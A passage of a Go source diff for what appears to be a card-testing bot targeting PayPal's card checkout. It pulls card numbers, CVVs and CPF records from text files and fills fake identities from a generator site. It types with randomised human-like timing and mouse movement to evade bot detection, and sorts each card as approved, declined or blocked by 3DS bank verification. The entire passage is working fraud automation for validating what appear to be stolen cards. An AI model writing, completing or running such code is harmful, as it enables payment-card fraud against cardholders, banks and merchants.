+					el.dispatchEvent(new ctx.win.Event('input',  {bubbles:true}));
+					el.dispatchEvent(new ctx.win.Event('change', {bubbles:true}));
+				})()
+			`, jsGetCtx, docLoc, fieldID), nil).Do(ctx)
+			time.Sleep(time.Duration(randInt(40, 100)) * time.Millisecond)
+		}
+
+		for i, ch := range texto {
+			chStr := string(ch)
+			script := fmt.Sprintf(`
+				(function(){
+					%s
+					var ctx = getCtx(%q);
+					if (!ctx) return 'ctx-null';
+					var el = ctx.doc.getElementById(%q);
+					if (!el) return 'not-found';
+
+					var win = ctx.win;
+
+					var kd = new win.KeyboardEvent('keydown', {key: %q, bubbles: true, cancelable: true});
+					try { el.dispatchEvent(kd); } catch(e) {}
+
+					var setter = Object.getOwnPropertyDescriptor(win.HTMLInputElement.prototype,'value').set;
+					var novo = (el.value || '') + %q;
+					setter.call(el, novo);
+
+					var ev = new win.Event('input', {bubbles: true});
+					try { el.dispatchEvent(ev); } catch(e) {}
+
+					var ku = new win.KeyboardEvent('keyup', {key: %q, bubbles: true, cancelable: true});
+					try { el.dispatchEvent(ku); } catch(e) {}
+
+					return 'ok';
+				})()
+			`, jsGetCtx, docLoc, fieldID, chStr, chStr, chStr)
+			_ = evaluateJS(ctx, script)
+
+			ms := randGauss(
+				float64(p.TypeMinMs+p.TypeMaxMs)/2.0,
+				float64(p.TypeMaxMs-p.TypeMinMs)/4.0,
+				float64(p.TypeMinMs),
+				float64(p.TypeMaxMs),
+			)
+			time.Sleep(time.Duration(ms) * time.Millisecond)
+
+			if i > 0 && randInt(0, 100) < p.ThinkChance {
+				thinkMs := randGauss(
+					float64(p.ThinkMinMs+p.ThinkMaxMs)/2.0,
+					float64(p.ThinkMaxMs-p.ThinkMinMs)/4.0,
+					float64(p.ThinkMinMs),
+					float64(p.ThinkMaxMs),
+				)
+				time.Sleep(time.Duration(thinkMs) * time.Millisecond)
+			}
+		}
+
+		_ = chromedp.Evaluate(fmt.Sprintf(`
+			(function(){
+				%s
+				var ctx = getCtx(%q);
+				if (!ctx) return;
+				var el = ctx.doc.getElementById(%q);
+				if (!el) return;
+				el.dispatchEvent(new ctx.win.Event('change', {bubbles:true}));
+				el.dispatchEvent(new ctx.win.Event('blur',   {bubbles:true}));
+			})()
+		`, jsGetCtx, docLoc, fieldID), nil).Do(ctx)
+
+		time.Sleep(time.Duration(randEnviesado(60, 180)) * time.Millisecond)
+		return nil
+	})
+}
+
+func humanReadPage(minMs, maxMs int) chromedp.ActionFunc {
+	return chromedp.ActionFunc(func(ctx context.Context) error {
+		p := getPersona(ctx)
+		ms := randGauss(
+			float64(minMs+maxMs)/2.0,
+			float64(maxMs-minMs)/4.0,
+			float64(minMs),
+			float64(maxMs),
+		)
+		total := int(ms * p.GlobalSleepMul)
+		partes := randInt(2, 5)
+		for i := 0; i < partes; i++ {
+			time.Sleep(time.Duration(total/partes) * time.Millisecond)
+
+			mx := randFloat(200, 1400)
+			my := randFloat(200, 800)
+			_ = chromedp.ActionFunc(func(ctx context.Context) error {
+				return input.DispatchMouseEvent(input.MouseMoved, mx, my).Do(ctx)
+			}).Do(ctx)
+
+			if randInt(0, 100) < p.ScrollChance {
+				_ = humanScroll(randInt(100, 400)).Do(ctx)
+			}
+		}
+		return nil
+	})
+}
+
+func humanRandSleep(minMs, maxMs int) chromedp.ActionFunc {
+	return humanPause(minMs, maxMs)
+}
+
+// ---------------------------------------------------------------------------
+// Aceitar cookies PayPal / popups
+// ---------------------------------------------------------------------------
+
+// fecharPopupsPayPal tenta fechar banners de cookies, popups de salvamento
+// de endereço do Chrome e afins que ficam sobre o formulário.
+func fecharPopupsPayPal(ctx context.Context) chromedp.ActionFunc {
+	return chromedp.ActionFunc(func(ctx context.Context) error {
+		script := `
+			(function(){
+				var resultados = [];
+
+				// 1. Banner de cookies do PayPal
+				var botoes = document.querySelectorAll('button, a, div[role="button"]');
+				for (var i = 0; i < botoes.length; i++) {
+					var t = (botoes[i].textContent || '').trim().toLowerCase();
+					if (t === 'sim, aceito' || t === 'aceitar' || t === 'aceitar todos' ||
+					    t === 'aceito' || t === 'concordo' || t === 'ok') {
+						try {
+							botoes[i].click();
+							resultados.push('cookies:' + t);
+							break;
+						} catch(e) {}
+					}
+				}
+
+				// 2. Botão X do banner de cookies
+				var xBtns = document.querySelectorAll('[aria-label*="echar"], [aria-label*="lose"], [aria-label*="Close"]');
+				for (var k = 0; k < xBtns.length; k++) {
+					try {
+						xBtns[k].click();
+						resultados.push('close-x');
+					} catch(e) {}
+				}
+
+				// 3. Popup "Salvar endereço?" do Chrome — botão "Agora não"
+				var todos = document.querySelectorAll('button');
+				for (var m = 0; m < todos.length; m++) {
+					var txt = (todos[m].textContent || '').trim().toLowerCase();
+					if (txt === 'agora não' || txt === 'agora nao' || txt === 'não' || txt === 'nao') {
+						try {
+							todos[m].click();
+							resultados.push('save-addr-nao');
+							break;
+						} catch(e) {}
+					}
+				}
+
+				return resultados.join(',');
+			})()
+		`
+		var res string
+		_ = chromedp.Evaluate(script, &res).Do(ctx)
+		if res != "" {
+			fmt.Printf("  → [popups] fechados: %s\n", res)
+		}
+		return nil
+	})
+}
+
+// ---------------------------------------------------------------------------
+// Escrita atômica
+// ---------------------------------------------------------------------------
+
+func reescreverArquivo(arquivo string, linhas []string) error {
+	tmp := arquivo + ".tmp"
+	f, err := os.Create(tmp)
+	if err != nil {
+		return err
+	}
+	w := bufio.NewWriter(f)
+	for _, l := range linhas {
+		if _, err := fmt.Fprintln(w, l); err != nil {
+			f.Close()
+			os.Remove(tmp)
+			return err
+		}
+	}
+	if err := w.Flush(); err != nil {
+		f.Close()
+		os.Remove(tmp)
+		return err
+	}
+	if err := f.Close(); err != nil {
+		os.Remove(tmp)
+		return err
+	}
+	return os.Rename(tmp, arquivo)
+}
+
+func lerEDeletarPrimeiro(arquivo string) (*DadosTxt, error) {
+	f, err := os.Open(arquivo)
+	if err != nil {
+		return nil, fmt.Errorf("não foi possível abrir %s: %w", arquivo, err)
+	}
+	var linhas []string
+	sc := bufio.NewScanner(f)
+	for sc.Scan() {
+		if l := strings.TrimSpace(sc.Text()); l != "" {
+			linhas = append(linhas, l)
+		}
+	}
+	f.Close()
+	if sc.Err() != nil {
+		return nil, sc.Err()
+	}
+	if len(linhas) == 0 {
+		return nil, fmt.Errorf("arquivo %s está vazio", arquivo)
+	}
+	dados, err := parseLinha(linhas[0])
+	if err != nil {
+		return nil, err
+	}
+	if err := reescreverArquivo(arquivo, linhas[1:]); err != nil {
+		return nil, err
+	}
+	return dados, nil
+}
+
+func parseLinha(linha string) (*DadosTxt, error) {
+	partes := strings.SplitN(linha, "|", 2)
+	if len(partes) < 2 {
+		return nil, fmt.Errorf("formato inválido (esperado NOME|CPF): %s", linha)
+	}
+	nome := strings.TrimSpace(partes[0])
+	cpf := strings.TrimSpace(partes[1])
+	if nome == "" || cpf == "" {
+		return nil, fmt.Errorf("formato inválido (nome ou CPF vazio): %s", linha)
+	}
+	return &DadosTxt{
+		Nome:       nome,
+		CPF:        cpf,
+		Nascimento: "",
+	}, nil
+}
+
+func lerEDeletarCartao(arquivo string) (*CartaoData, error) {
+	f, err := os.Open(arquivo)
+	if err != nil {
+		return nil, fmt.Errorf("não foi possível abrir %s: %w", arquivo, err)
+	}
+	var linhas []string
+	sc := bufio.NewScanner(f)
+	for sc.Scan() {
+		if l := strings.TrimSpace(sc.Text()); l != "" {
+			linhas = append(linhas, l)
+		}
+	}
+	f.Close()
+	if sc.Err() != nil {
+		return nil, sc.Err()
+	}
+	if len(linhas) == 0 {
+		return nil, fmt.Errorf("arquivo %s está vazio", arquivo)
+	}
+	partes := strings.Split(linhas[0], "|")
+	if len(partes) < 4 {
+		return nil, fmt.Errorf("formato inválido em carnews.txt: %s", linhas[0])
+	}
+	card := &CartaoData{
+		Numero: strings.TrimSpace(partes[0]),
+		Mes:    strings.TrimSpace(partes[1]),
+		Ano:    strings.TrimSpace(partes[2]),
+		CVV:    strings.TrimSpace(partes[3]),
+	}
+	if len(card.Ano) < 4 {
+		return nil, fmt.Errorf("carnews.txt: ano inválido %q (esperado YYYY)", card.Ano)
+	}
+	if len(card.Mes) == 0 || len(card.CVV) < 3 {
+		return nil, fmt.Errorf("carnews.txt: mês/cvv inválido: %q/%q", card.Mes, card.CVV)
+	}
+	if err := reescreverArquivo(arquivo, linhas[1:]); err != nil {
+		return nil, err
+	}
+	return card, nil
+}
+
+// ---------------------------------------------------------------------------
+// 4devs
+// ---------------------------------------------------------------------------
+
+var httpCli4Devs = &http.Client{
+	Timeout:   30 * time.Second,
+	Transport: &http.Transport{MaxIdleConnsPerHost: 10},
+}
+
+func buscarEnderecoAleatorio(uf string) (*Pessoa4Devs, error) {
+	form := url.Values{}
+	form.Set("acao", "gerar_pessoa")
+	form.Set("sexo", "I")
+	form.Set("pontuacao", "N")
+	form.Set("idade", "0")
+	form.Set("cep_estado", uf)
+	form.Set("txt_qtde", "1")
+	form.Set("cep_cidade", "")
+
+	req, err := http.NewRequest("POST",
+		"https://www.4devs.com.br/ferramentas_online.php",
+		bytes.NewBufferString(form.Encode()))
+	if err != nil {
+		return nil, err
+	}
+	req.Header.Set("accept", "*/*")
+	req.Header.Set("content-type", "application/x-www-form-urlencoded")
+	req.Header.Set("origin", "https://www.4devs.com.br")
+	req.Header.Set("referer", "https://www.4devs.com.br/gerador_de_pessoas")
+	req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")
+
+	resp, err := httpCli4Devs.Do(req)
+	if err != nil {
+		return nil, err
+	}
+	defer resp.Body.Close()
+
+	var pessoas []Pessoa4Devs
+	if err := json.NewDecoder(resp.Body).Decode(&pessoas); err != nil {
+		return nil, fmt.Errorf("erro ao decodificar resposta: %w", err)
+	}
+	if len(pessoas) == 0 {
+		return nil, fmt.Errorf("API não retornou dados")
+	}
+	return &pessoas[0], nil
+}
+
+// ---------------------------------------------------------------------------
+// E-mail
+// ---------------------------------------------------------------------------
+
+var acentos = strings.NewReplacer(
+	"á", "a", "à", "a", "ã", "a", "â", "a",
+	"é", "e", "è", "e", "ê", "e",
+	"í", "i", "ì", "i", "î", "i",
+	"ó", "o", "ò", "o", "õ", "o", "ô", "o",
+	"ú", "u", "ù", "u", "û", "u",
+	"ç", "c", "ñ", "n",
+	"Á", "A", "À", "A", "Ã", "A", "Â", "A",
+	"É", "E", "È", "E", "Ê", "E",
+	"Í", "I", "Ì", "I",
+	"Ó", "O", "Ò", "O", "Õ", "O", "Ô", "O",
+	"Ú", "U", "Ù", "U",
+	"Ç", "C",
+)
+
+func gerarEmail(nome string) string {
+	provedores := []string{"@icloud.com", "@gmail.com", "@outlook.com"}
+	partes := strings.Fields(strings.ToLower(acentos.Replace(nome)))
+	var local string
+	switch len(partes) {
+	case 0:
+		local = "user"
+	case 1:
+		local = partes[0]
+	default:
+		local = partes[0] + "." + partes[len(partes)-1]
+	}
+	return fmt.Sprintf("%s%d%s", local, randInt(1000, 9999), provedores[randInt(0, len(provedores))])
+}
+
+// ---------------------------------------------------------------------------
+// JS helpers
+// ---------------------------------------------------------------------------
+
+const jsGetCtx = `
+	function getCtx(loc) {
+		if (loc === 'page') return {doc: document, win: window};
+		var parts = loc.split('-');
+		try {
+			if (parts.length === 2) {
+				var w = document.querySelectorAll('iframe')[parseInt(parts[1])].contentWindow;
+				return {doc: w.document, win: w};
+			} else if (parts.length === 3) {
+				var outerW = document.querySelectorAll('iframe')[parseInt(parts[1])].contentWindow;
+				var innerW = outerW.document.querySelectorAll('iframe')[parseInt(parts[2])].contentWindow;
+				return {doc: innerW.document, win: innerW};
+			}
+		} catch(e) {}
+		return null;
+	}`
+
+const jsAcharDoc = `
+(function(){
+	if (document.getElementById('credit-card-number')) return 'page';
+	var iframes = document.querySelectorAll('iframe');
+	for (var i = 0; i < iframes.length; i++) {
+		try {
+			var doc1 = iframes[i].contentDocument || iframes[i].contentWindow.document;
+			if (!doc1) continue;
+			if (doc1.getElementById('credit-card-number')) return 'iframe-' + i;
+			var nested = doc1.querySelectorAll('iframe');
+			for (var j = 0; j < nested.length; j++) {
+				try {
+					var doc2 = nested[j].contentDocument || nested[j].contentWindow.document;
+					if (doc2 && doc2.getElementById('credit-card-number')) return 'iframe-' + i + '-' + j;
+				} catch(e2) {}
+			}
+		} catch(e) {}
+	}
+	return '';
+})()`
+
+const jsDebugIframes = `
+(function(){
+	var r = [];
+	var main = document.querySelectorAll('iframe');
+	r.push('main-iframes=' + main.length);
+	for (var i = 0; i < main.length; i++) {
+		try {
+			var d1 = main[i].contentDocument;
+			var cc1 = d1 ? d1.querySelectorAll('#credit-card-number').length : -1;
+			r.push('[' + i + '] cc=' + cc1);
+		} catch(e) { r.push('[' + i + '] err'); }
+	}
+	return r.join(' | ');
+})()`
+
+// Detecção de VBV/3DS — expandido com termos do Bradesco/Itaú/etc.
+const jsDetectarVBV = `
+(function(){
+	try {
+		var u = location.href || '';
+		var ul = u.toLowerCase();
+		// URL do banco ou 3DS
+		if (/3dsecure|3ds|vbv|verifiedbyvisa|mastercardsecurecode|challenge|authenticate|bradesco|itau|santander|banco|verificacao|validacao/i.test(ul)) {
+			return 'url:' + u;
+		}
+
+		var body = (document.body && document.body.innerText) ? document.body.innerText.toLowerCase() : '';
+		var pistas = [
+			'verificação', 'verificacao', 'verification',
+			'validação', 'validacao', 'validation',
+			'validação de segurança', 'validacao de seguranca',
+			'validação de seguranca', 'security validation',
+			'seu banco solicitou', 'banco solicitou',
+			'código enviado', 'codigo enviado', 'sms',
+			'3d secure', '3ds', 'verified by visa', 'vbv',
+			'mastercard securecode', 'autenticação', 'autenticacao',
+			'confirme sua identidade', 'confirme a compra',
+			'código de segurança', 'codigo de seguranca',
+			'digite o código', 'digite o codigo',
+			'token', 'código de verificação', 'codigo de verificacao',
+			'senha do cartão', 'senha do cartao'
+		];
+		for (var i=0;i<pistas.length;i++){
+			if (body.indexOf(pistas[i]) >= 0) return 'txt:' + pistas[i];
+		}
+
+		// iframes com src suspeito
+		var iframes = document.querySelectorAll('iframe');
+		for (var k=0;k<iframes.length;k++){
+			try {
+				var su = (iframes[k].src || '').toLowerCase();
+				if (/3dsecure|3ds|vbv|challenge|authentication|bradesco|itau|santander|verificacao|validacao/i.test(su)) {
+					return 'iframe:' + su;
+				}
+			} catch(e) {}
+		}
+
+		// título da página
+		var title = (document.title || '').toLowerCase();
+		if (/3d|vbv|verified|challenge|autentic|verific|valid/i.test(title)) {
+			return 'title:' + title;
+		}
+
+		return '';
+	} catch(e) { return ''; }
+})()`
+
+func jsCoordsIframe(docLoc, targetInputID string) string {
+	return fmt.Sprintf(`
+		(function(){
+			%s
+			var ctx = getCtx(%q);
+			if (!ctx) return null;
+			var doc = ctx.doc;
+			var lbl = doc.querySelector('label[for="' + %q + '"]');
+			var el = lbl || doc.getElementById(%q);
+			if (!el) return null;
+			try { el.scrollIntoView({block:'center', behavior:'instant'}); } catch(e) {}
+			var r = el.getBoundingClientRect();
+			return [r.left + r.width/2, r.top + r.height/2];
+		})()
+	`, jsGetCtx, docLoc, targetInputID, targetInputID)
+}
+
+func jsFrameOffset(docLoc string) string {
+	return fmt.Sprintf(`
+		(function(){
+			%s
+			var loc = %q;
+			if (loc === 'page') return [0, 0];
+			var parts = loc.split('-');
+			var ox = 0, oy = 0;
+			var doc = document;
+			for (var k = 1; k < parts.length; k++) {
+				try {
+					var idx = parseInt(parts[k]);
+					var fr = doc.querySelectorAll('iframe')[idx];
+					var r = fr.getBoundingClientRect();
+					ox += r.left;
+					oy += r.top;
+					doc = fr.contentDocument || fr.contentWindow.document;
+				} catch(e) { return [ox, oy]; }
+			}
+			return [ox, oy];
+		})()
+	`, jsGetCtx, docLoc)
+}
+
+func jsPreencherSelect(docLoc, fieldID, valor string) string {
+	return fmt.Sprintf(`
+	(function(){
+		%s
+		var ctx = getCtx(%q);
+		if (!ctx) return 'ctx-null';
+		var el = ctx.doc.getElementById(%q);
+		if (!el) return 'not-found';
+		el.value = %q;
+		el.dispatchEvent(new ctx.win.Event('change',{bubbles:true}));
+		el.dispatchEvent(new ctx.win.Event('blur',  {bubbles:true}));
+		return 'ok';
+	})()`, jsGetCtx, docLoc, fieldID, valor)
+}
+
+func jsClicarBotao(docLoc, buttonID string) string {
+	return fmt.Sprintf(`
+	(function(){
+		%s
+		var ctx = getCtx(%q);
+		if (!ctx) return 'ctx-null';
+		var el = ctx.doc.getElementById(%q);
+		if (!el) return 'not-found';
+		el.click();
+		return 'ok';
+	})()`, jsGetCtx, docLoc, buttonID)
+}
+
+func selecionarPorLabel(docLoc, labelFor string) string {
+	return fmt.Sprintf(`
+		(function(){
+			%s
+			var locs = [%q, 'page'];
+			for (var li = 0; li < locs.length; li++) {
+				var ctx = getCtx(locs[li]);
+				if (!ctx) continue;
+				var doc = ctx.doc;
+				var win = ctx.win;
+
+				var lbl = doc.querySelector('label[for="' + %q + '"]');
+				if (lbl) {
+					try { lbl.click(); } catch(e) {}
+					var inp = doc.getElementById(%q);
+					if (inp) {
+						try { inp.click(); } catch(e) {}
+						try { inp.dispatchEvent(new win.Event('change',{bubbles:true})); } catch(e) {}
+						try { inp.dispatchEvent(new win.Event('blur',  {bubbles:true})); } catch(e) {}
+					}
+					return 'ok:' + locs[li];
+				}
+
+				var el = doc.getElementById(%q);
+				if (el) {
+					try { el.click(); } catch(e) {}
+					try { el.dispatchEvent(new win.Event('change',{bubbles:true})); } catch(e) {}
+					try { el.dispatchEvent(new win.Event('blur',  {bubbles:true})); } catch(e) {}
+					return 'radio-ok:' + locs[li];
+				}
+			}
+			return 'not-found';
+		})()
+	`, jsGetCtx, docLoc, labelFor, labelFor, labelFor)
+}
+
+func evaluateJS(ctx context.Context, script string) string {
+	var res string
+	_ = chromedp.Evaluate(script, &res).Do(ctx)
+	return res
+}
+
+// ---------------------------------------------------------------------------
+// PayPal — troca de moeda
+// ---------------------------------------------------------------------------
+
+func trocarMoedaPayPal(ctx context.Context, docLoc, moeda string) {
+	fmt.Printf("  → [troca-moeda] alternando para %s (clique real)...\n", moeda)
+
+	var targetID string
+	if moeda == "USD" {
+		targetID = "paypal-currency-conversion-option"
+	} else {
+		targetID = "vendor-currency-conversion-option"
+	}
+
+	checkScript := fmt.Sprintf(`
+		(function(){
+			%s
+			var locs = [%q, 'page'];
+			for (var li = 0; li < locs.length; li++) {
+				var ctx = getCtx(locs[li]);
+				if (!ctx) continue;
+				var doc = ctx.doc;
+				var paypal = doc.getElementById('paypal-currency-conversion-option');
+				var vendor = doc.getElementById('vendor-currency-conversion-option');
+				if (!paypal && !vendor) continue;
+				if (paypal && paypal.checked) return 'USD:' + locs[li];
+				if (vendor && vendor.checked) return 'BRL:' + locs[li];
+				return 'none:' + locs[li];
+			}
+			return 'not-found';
+		})()
+	`, jsGetCtx, docLoc)
+
+	clickReal := func() bool {
+		var coords []float64
+		coordScript := jsCoordsIframe(docLoc, targetID)
+		if err := chromedp.Evaluate(coordScript, &coords).Do(ctx); err != nil || len(coords) < 2 {
+			fmt.Println(cor(cYell, "    ⚠ coords do label não encontradas"))
+			return false
+		}
+
+		var off []float64
+		if err := chromedp.Evaluate(jsFrameOffset(docLoc), &off).Do(ctx); err != nil || len(off) < 2 {
+			off = []float64{0, 0}
+		}
+
+		absX := coords[0] + off[0]
+		absY := coords[1] + off[1]
+		fmt.Printf("    → clique real em (%.0f, %.0f) no label de %s\n", absX, absY, moeda)
+
+		_ = chromedp.ActionFunc(func(ctx context.Context) error {
+			return input.DispatchMouseEvent(input.MouseMoved, absX, absY).Do(ctx)
+		}).Do(ctx)
+		time.Sleep(time.Duration(randInt(80, 180)) * time.Millisecond)
+
+		_ = chromedp.ActionFunc(func(ctx context.Context) error {
+			return input.DispatchMouseEvent(input.MousePressed, absX, absY).
+				WithButton(input.Left).WithClickCount(1).Do(ctx)
+		}).Do(ctx)
+		time.Sleep(time.Duration(randInt(40, 90)) * time.Millisecond)
+
+		_ = chromedp.ActionFunc(func(ctx context.Context) error {
+			return input.DispatchMouseEvent(input.MouseReleased, absX, absY).
+				WithButton(input.Left).WithClickCount(1).Do(ctx)
+		}).Do(ctx)
+
+		time.Sleep(time.Duration(randInt(400, 800)) * time.Millisecond)
+		return true
+	}
+
+	estado := evaluateJS(ctx, checkScript)
+	fmt.Printf("    estado atual: %s (quer=%s)\n", estado, moeda)
+
+	if strings.HasPrefix(estado, moeda+":") {
+		fmt.Printf("    ✓ já está em %s\n", moeda)
+		return
+	}
+
+	for tent := 1; tent <= 3; tent++ {
+		if !clickReal() {
+			return
+		}
+		estado2 := evaluateJS(ctx, checkScript)
+		fmt.Printf("    verificação %d: %s\n", tent, estado2)
+		if strings.HasPrefix(estado2, moeda+":") {
+			fmt.Printf("    ✓ confirmado em %s\n", moeda)
+			return
+		}
+	}
+	fmt.Println(cor(cYell, "    ⚠ não consegui confirmar a troca (segue mesmo assim)"))
+}
+
+func submitPayPal(ctx context.Context, locs []string) bool {
+	fmt.Println("  → Clicando submit-button...")
+	for _, loc := range locs {
+		res := evaluateJS(ctx, jsClicarBotao(loc, "submit-button"))
+		fmt.Printf("    %-30s → %s (%s)\n", "submit-button", res, loc)
+		if res == "ok" || res == "clicked" {
+			return true
+		}
+	}
+	return false
+}
+
+// esperarResultadoPayPal retorna:
+//   1 = aprovado
+//   0 = recusado
+//  -1 = VBV/3DS detectado
+//  -2 = timeout
+func esperarResultadoPayPal(ctx context.Context) (int, string) {
+	dl := time.Now().Add(45 * time.Second)
+	vbvCheck := time.Time{}
+	popupCheck := time.Time{}
+	for time.Now().Before(dl) {
+		var u string
+		_ = chromedp.Location(&u).Do(ctx)
+
+		if strings.Contains(u, "thank-you") {
+			return 1, u
+		}
+
+		// checa VBV a cada 2s
+		if time.Since(vbvCheck) >= 2*time.Second {
+			vbvCheck = time.Now()
+			var vbv string
+			_ = chromedp.Evaluate(jsDetectarVBV, &vbv).Do(ctx)
+			if vbv != "" {
+				fmt.Printf("  🔒 VBV/3DS detectado: %s\n", vbv)
+				return -1, u
+			}
+		}
+
+		// tenta fechar popups a cada 3s
+		if time.Since(popupCheck) >= 3*time.Second {
+			popupCheck = time.Now()
+			_ = fecharPopupsPayPal(ctx).Do(ctx)
+		}
+
+		time.Sleep(2 * time.Second)
+	}
+	var u string
+	_ = chromedp.Location(&u).Do(ctx)
+	return -2, u
+}
+
+func extrairErroPayPal(ctx context.Context, docLoc string) string {
+	var msg string
+	_ = chromedp.Evaluate(fmt.Sprintf(`
+		(function(){
+			%s
+			var locs = [%q, 'page'];
+			var sels = [
+				'.css-h0boqy','[class*="h0boqy"]',
+				'[class*="ErrorSVG"] ~ p','[class*="error"] p',
+				'[class*="Error"] p','[role="alert"] p','[role="alert"]'
+			];
+			for(var li=0;li<locs.length;li++){
+				var ctx2 = getCtx(locs[li]);
+				if(!ctx2) continue;
+				for(var si=0;si<sels.length;si++){
+					var el = ctx2.doc.querySelector(sels[si]);
+					if(el){ var t=(el.textContent||'').trim(); if(t) return t; }
+				}
+			}
+			return '';
+		})()
+	`, jsGetCtx, docLoc), &msg).Do(ctx)
+	return strings.TrimSpace(msg)
+}
+
+func erroRetentavel(msg string) bool {
+	msg = strings.ToLower(msg)
+	return strings.Contains(msg, "atualize") ||
+		strings.Contains(msg, "tente de novo") ||
+		strings.Contains(msg, "tente novamente") ||
+		strings.Contains(msg, "try again") ||
+		strings.Contains(msg, "alguns minutos")
+}
+
+func preencherPayPal(ctx context.Context, card *CartaoData, end *Pessoa4Devs, dados *DadosTxt, moedaTentativa string) int {
+	expiry := card.Mes + "/" + card.Ano[2:]
+
+	fmt.Println("  → Aguardando SDK PayPal inicializar...")
+	time.Sleep(time.Duration(randInt(3500, 5500)) * time.Millisecond)
+
+	fmt.Println("  → Fechando popups iniciais...")
+	_ = fecharPopupsPayPal(ctx).Do(ctx)
+	time.Sleep(time.Duration(randInt(500, 1200)) * time.Millisecond)
+
+	fmt.Println("  → Buscando #credit-card-number...")
+	var docLoc string
+	searchStart := time.Now()
+	deadline := searchStart.Add(40 * time.Second)
+	lastDebug := time.Time{}
+	for time.Now().Before(deadline) {
+		if time.Since(lastDebug) >= 6*time.Second {
+			var dbg string
+			_ = chromedp.Evaluate(jsDebugIframes, &dbg).Do(ctx)
+			fmt.Printf("  [%3.0fs] %s\n", time.Since(searchStart).Seconds(), dbg)
+			lastDebug = time.Now()
+		}
+		if err := chromedp.Evaluate(jsAcharDoc, &docLoc).Do(ctx); err != nil {
+			fmt.Printf("  eval err: %v\n", err)
+		}
+		if docLoc != "" {
+			fmt.Printf("  → Formulário encontrado em: %s\n", docLoc)
+			break
+		}
+
+		// tenta fechar popups a cada 5s enquanto busca
+		if time.Since(lastDebug) >= 5*time.Second {
+			_ = fecharPopupsPayPal(ctx).Do(ctx)
+		}
+
+		time.Sleep(time.Duration(randInt(250, 600)) * time.Millisecond)
+	}
+	if docLoc == "" {
+		fmt.Println(cor(cYell, "  ⚠ timeout: #credit-card-number não encontrado"))
+		return -1
+	}
+	time.Sleep(time.Duration(randInt(400, 900)) * time.Millisecond)
+
+	// Fecha popups de novo antes de preencher
+	_ = fecharPopupsPayPal(ctx).Do(ctx)
+	time.Sleep(time.Duration(randInt(300, 700)) * time.Millisecond)
+
+	locs := []string{docLoc, "page"}
+
+	if tipoCartao == "debito" {
+		fmt.Println("  → [tipo=debito] Tentando selecionar DÉBITO...")
+		selectDebito(ctx, docLoc)
+	} else {
+		fmt.Println("  → [tipo=credito] Tentando selecionar CRÉDITO...")
+		selectCredito(ctx, docLoc)
+	}
+	time.Sleep(time.Duration(randInt(300, 700)) * time.Millisecond)
+
+	fillChar := func(fieldID, valor string) error {
+		for _, loc := range locs {
+			fmt.Printf("    %-30s → digitando em %s...\n", fieldID, loc)
+			err := humanTypeInIframe(loc, fieldID, valor).Do(ctx)
+			if err == nil {
+				check := fmt.Sprintf(`
+					(function(){
+						%s
+						var ctx = getCtx(%q);
+						if (!ctx) return '';
+						var el = ctx.doc.getElementById(%q);
+						if (!el) return '';
+						return el.value || '';
+					})()
+				`, jsGetCtx, loc, fieldID)
+				var v string
+				_ = chromedp.Evaluate(check, &v).Do(ctx)
+				if v != "" {
+					fmt.Printf("    %-30s → ok (%s) valor=%q\n", fieldID, loc, v)
+					return nil
+				}
+			}
+		}
+		for _, loc := range locs {
+			script := fmt.Sprintf(`
+				(function(){
+					%s
+					var ctx = getCtx(%q);
+					if (!ctx) return 'ctx-null';
+					var el = ctx.doc.getElementById(%q);
+					if (!el) return 'not-found';
+					el.focus();
+					var setter = Object.getOwnPropertyDescriptor(ctx.win.HTMLInputElement.prototype,'value').set;
+					setter.call(el, %q);
+					el.dispatchEvent(new ctx.win.Event('input',  {bubbles:true}));
+					el.dispatchEvent(new ctx.win.Event('change', {bubbles:true}));
+					el.dispatchEvent(new ctx.win.Event('blur',   {bubbles:true}));
+					return 'ok';
+				})()
+			`, jsGetCtx, loc, fieldID, valor)
+			if res := evaluateJS(ctx, script); res == "ok" {
+				fmt.Printf("    %-30s → fallback ok (%s)\n", fieldID, loc)
+				return nil
+			}
+		}
+		return fmt.Errorf("fill(%s): not-found", fieldID)
+	}
+
+	sel := func(fieldID, valor string) error {
+		for _, loc := range locs {
+			res := evaluateJS(ctx, jsPreencherSelect(loc, fieldID, valor))
+			fmt.Printf("    %-30s → %s (%s)\n", fieldID, res, loc)
+			if res == "ok" {
+				return nil
+			}
+		}
+		fmt.Printf("    %-30s → não encontrado (ignorando)\n", fieldID)
+		return nil
+	}
+
+	fmt.Println("  → phone:", end.Celular)
+	{
+		ok := false
+		dl := time.Now().Add(12 * time.Second)
+		for !ok && time.Now().Before(dl) {
+			for _, loc := range locs {
+				err := humanTypeInIframe(loc, "phone", end.Celular).Do(ctx)
+				if err == nil {
+					fmt.Printf("    %-30s → ok (%s)\n", "phone", loc)
+					ok = true
+					break
+				}
+			}
+			if !ok {
+				time.Sleep(time.Duration(randInt(200, 500)) * time.Millisecond)
+			}
+		}
+		if !ok {
+			fmt.Println("  (aviso: phone não encontrado — continuando)")
+		}
+	}
+	time.Sleep(time.Duration(randInt(250, 600)) * time.Millisecond)
+
+	fmt.Println("  → credit-card-number:", card.Numero)
+	if err := fillChar("credit-card-number", card.Numero); err != nil {
+		fmt.Println(cor(cYell, "  ⚠ "+err.Error()))
+		return -1
+	}
+	time.Sleep(time.Duration(randInt(200, 500)) * time.Millisecond)
+
+	fmt.Println("  → expiry-date:", expiry)
+	if err := fillChar("expiry-date", expiry); err != nil {
+		fmt.Println(cor(cYell, "  ⚠ "+err.Error()))
+		return -1
+	}
+	time.Sleep(time.Duration(randInt(200, 500)) * time.Millisecond)
+
+	fmt.Println("  → credit-card-security:", card.CVV)
+	if err := fillChar("credit-card-security", card.CVV); err != nil {
+		fmt.Println(cor(cYell, "  ⚠ "+err.Error()))
+		return -1
+	}
+	time.Sleep(time.Duration(randInt(250, 600)) * time.Millisecond)
+
+	fmt.Println("  → billingAddress.state:", end.Estado)
+	if err := sel("billingAddress.state", end.Estado); err != nil {
+		fmt.Println(cor(cYell, "  ⚠ "+err.Error()))
+		return -1
+	}
+	time.Sleep(time.Duration(randInt(200, 500)) * time.Millisecond)
+
+	fmt.Println("  → identityDocument (CPF):", dados.CPF)
+	if err := fillChar("identityDocument", dados.CPF); err != nil {
+		fmt.Printf("  (aviso: %v — continuando)\n", err)
+	}
+	time.Sleep(time.Duration(randInt(350, 800)) * time.Millisecond)
+
+	// fecha popups antes de trocar moeda e submeter
+	_ = fecharPopupsPayPal(ctx).Do(ctx)
+	time.Sleep(time.Duration(randInt(300, 700)) * time.Millisecond)
+
